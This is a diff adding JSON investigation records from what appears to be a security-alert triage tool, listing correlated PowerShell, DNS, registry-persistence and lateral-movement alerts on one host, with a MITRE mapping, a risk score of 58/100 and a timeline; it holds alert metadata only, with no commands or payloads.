+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T05:46:14.540Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "b1ab00bc07eca78495d24e9845655187",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on Ayush",
+        "severity": "medium",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T05:38:31.388Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "c15eb41fceba7a5dbfc0037190d595d5",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T05:31:29.618Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "5da4b4d7e5bc6a295d67609b38d256aa",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:59:57.410Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "9eb67c3baf91a7f2b0bdf02a6cf3c1eb",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:46:12.727Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "3605feab0937a9c5c92f0821323dd0a5",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 Splunkd",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:36:28.059Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "1870eaa20d8b5561b319ccb7c3471bbd",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:31:48.012Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "77d2cc61911dba767beb23c3bb9ddaf6",
+        "title": "[HIGH] Registry Persistence \u2013 msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5} on Ayush",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:29:23.265Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "958be4197b50e6ba13ef34e4a1c602b4",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:24:33.488Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "75c6e6f980064fec6c16743bba8485cc",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 pwsh.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:24:28.880Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "9ea534d11ed871adfc98996a8eb02d5b",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T04:04:16.653Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "9b7c36598c4085a08830778705f427d0",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 0EEBD81D-75D7-48B0-B740-E3ABBFB985A3",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:57:03.289Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "aae8baeab0fb1df7fa6b9edc77a167f1",
+        "title": "[HIGH] Registry Persistence \u2013 GoogleChromeAutoLaunch_8BB3020C2CA1733EBB223E6A127FF2D8 on Ayush",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:56:41.702Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "4041f50316a88b28ae59937b54211866",
+        "title": "[HIGH] Registry Persistence \u2013 Figma Agent on Ayush",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:54:33.378Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "bc753925ea106c7a3769bcf86451d1e1",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:54:19.136Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "abca67efb340b9bd560e32c0a1be518c",
+        "title": "[HIGH] Registry Persistence \u2013 HPSEU_Host_Launcher on Ayush",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:53:14.934Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "78f8d5cbfd612180b34ebd8d783edee7",
+        "title": "[HIGH] Registry Persistence \u2013 HPSEU_Host_Launcher on Ayush",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:53:14.860Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "f004e4b57fa6f347bf526af68ce2491d",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 ayushkumbhar1111@gmail.com",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:52:35.095Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "17b958d2353cd08e71b5a2986a753162",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 ayushkumbhar1111@gmail.com",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:52:35.046Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "87fdb1188b5cef460c387a913d0c8d59",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 D4EE5971-BBA3-453C-8E7A-D5F47BFAC98D",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:52:32.758Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "9183f5e96cce1c75a33b05dc34bcfe97",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 Splunkd",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T03:52:21.023Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      }
+    ],
+    "enrichments": [],
+    "evidence": {
+      "ioc_count": 0,
+      "enrichment_count": 0,
+      "correlated_alert_count": 25,
+      "mitre_count": 1
+    },
+    "logs": [
+      "Investigation started for alert fcafefe2cc181e8a44365fb4a5f35214",
+      "Context extraction complete: found 2 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious.",
+      "Decision layer complete: medium priority, risk 58/100"
+    ],
+    "mitre_mappings": [
+      {
+        "technique": "T1550.002",
+        "tactic": "Lateral Movement"
+      }
+    ],
+    "recommendation": "Confirm the detection context and close as benign only when the evidence supports it.",
+    "risk_assessment": {
+      "risk_score": 58,
+      "priority": "medium",
+      "confidence_score": 55
+    },
+    "timeline": [
+      {
+        "timestamp": {
+          "$date": "2026-09-29T07:11:47.425Z"
+        },
+        "event_type": "Lateral Movement",
+        "description": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 Splunkd",
+        "source": "splunk"
+      }
+    ]
+  }
+]
